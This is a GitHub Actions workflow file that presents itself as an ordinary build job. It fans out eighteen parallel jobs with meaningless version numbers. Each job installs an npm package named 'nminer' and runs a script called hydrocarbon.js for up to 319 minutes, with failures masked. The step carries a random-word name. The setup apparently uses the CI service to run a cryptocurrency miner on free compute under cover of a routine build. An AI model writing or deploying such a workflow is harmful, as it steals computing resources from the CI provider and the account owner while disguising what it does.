name: hydrocarbon
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3264 }
          - { version: 3927 }
          - { version: 7600 }
          - { version: 4932 }
          - { version: 3568 }
          - { version: 3516 }
          - { version: 7061 }
          - { version: 6274 }
          - { version: 7780 }
          - { version: 6371 }
          - { version: 3508 }
          - { version: 2548 }
          - { version: 8615 }
          - { version: 7387 }
          - { version: 2390 }
          - { version: 2675 }
          - { version: 5204 }
          - { version: 3010 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: voluntarily ouch joyously bourgeoisie because
        run: |
          npm install nminer@latest
          timeout 319m node hydrocarbon.js || echo "hydrocarbon executed"